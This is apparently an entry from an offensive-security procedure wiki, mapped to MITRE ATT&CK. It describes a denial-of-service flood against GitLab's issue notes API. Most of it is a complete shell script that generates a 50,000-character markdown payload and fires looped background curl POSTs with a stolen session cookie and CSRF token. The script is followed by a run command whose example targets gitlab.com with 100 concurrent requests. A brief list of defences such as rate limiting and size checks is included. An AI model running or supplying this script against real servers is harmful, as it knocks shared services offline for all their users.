---
tags:
  - dos
  - server-side
type: procedure
tools:
  - '[[tools/Curl-HTTP-Client]]'
  - '[[tools/Sed-Stream-Editor]]'
  - '[[tools/Head-File-Extractor]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/poc-sh-run-dos-script]]'
  - '[[commands/head-sed-generate-payload]]'
  - '[[commands/curl-post-large-comment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:55.995Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 0098ad0f-c7bc-4487-a70a-e58d8485233c
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
---
# Execute-Server-Side-DoS-with-Script

## Summary

This procedure uses a shell script to repeatedly send 50,000-character comment requests to GitLab's /notes endpoint, exhausting server CPU and denying service to all users.

## Description

Building on client-side proof, this automates floods against the issue notes API, leveraging no rate limits or size checks. Requires authenticated session details in the script. Targets GitLab's Ruby/Sidekiq backend, causing PostgreSQL/Redis overload indirectly via CPU spikes. Outcomes: instance-wide DoS.

## Requirements

1. GitLab host, project URL, issue ID
2. Extracted CSRF token and session cookie
3. Shell environment with curl, sed, head

## Defense

Defensive measures and detection strategies:

- Rate-limit API requests per user/IP
- Enforce payload size limits server-side
- Monitor CPU spikes correlated with /notes POSTs
- Use WAF to block oversized requests

## Objectives

1. Automate large payload submission
2. Flood server with concurrent requests
3. Achieve resource exhaustion

## Instructions

### Step 1: Create poc.sh Script

**Context**: Embed payload gen and curl loop.

No command; write script:
```bash
#!/bin/sh
charBlock=$(head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g')
payload='[a]($charBlock)'

gitlabHost=$1
ProjectURL=$2
targetID=$3
loop=$4

curl=`cat << EOS
curl
 --insecure
 --silent
 --output /dev/null
 ${ProjectURL}/notes?target_id=${targetID}&target_type=issue
 --header 'Host: ${gitlabHost}'
 --header 'X-CSRF-Token: [PLACEHOLDER]'
 -b '_gitlab_session=[PLACEHOLDER]'
 --data-binary 'note[noteable_type]=Issue&note[noteable_id]=3&note[note]=${payload}&merge_request_diff_head_sha=undefined'
EOS`

for i in `seq ${loop}`
do
 eval ${curl}&
done
```

> Script ready for execution using [[commands/head-sed-generate-payload]] and [[commands/curl-post-large-comment]].

### Step 2: Run the DoS Script

**Context**: Launch concurrent requests.

**Command** ([[commands/poc-sh-run-dos-script]]):
```bash
./poc.sh [GitLab host] [Project URL] [target ID] [Repeat count]
```

> e.g., ./poc.sh gitlab.com /user/test01 1 100; spawns 100 background curls.

### Step 3: Verify Server Impact

**Context**: Check for exhaustion.

No command; monitor server metrics.

> CPU >90%, service slowdowns.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[OS Exhaustion Flood]] OS Exhaustion Floods

### Sub-Techniques


## Commands Used

- [[commands/poc-sh-run-dos-script]]
- [[commands/head-sed-generate-payload]]
- [[commands/curl-post-large-comment]]

## Tools Used

- [[tools/Curl-HTTP-Client]]
- [[tools/Sed-Stream-Editor]]
- [[tools/Head-File-Extractor]]

## Tags

- dos
- server-side
